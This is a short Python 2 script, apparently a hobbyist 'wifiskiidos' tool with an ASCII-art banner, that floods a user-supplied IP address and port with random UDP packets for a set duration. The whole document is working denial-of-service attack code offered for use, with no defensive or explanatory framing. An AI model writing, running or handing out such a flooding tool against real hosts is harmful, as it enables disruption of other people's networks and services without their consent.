print "__      _(_)/ _(_)___| | _(_|_)"
print "\ \ /\ / / | |_| / __| |/ / | |"
print " \ V  V /| |  _| \__ \   <| | |"
print "  \_/\_/ |_|_| |_|___/_|\_\_|_|"

import socket
import random
import time

print "----------------------------wifiskiidos--------------------------------"
print "---------coded by sm1l3 and w3s7---------"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(50)
ip = raw_input("ip/URL:")
port = input("port:")
duration = input("time:")
timeout = time.time() + duration
sent = 0
while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes,(ip, port))
    sent = sent + 1
    print'wifiskii dos started:',sent

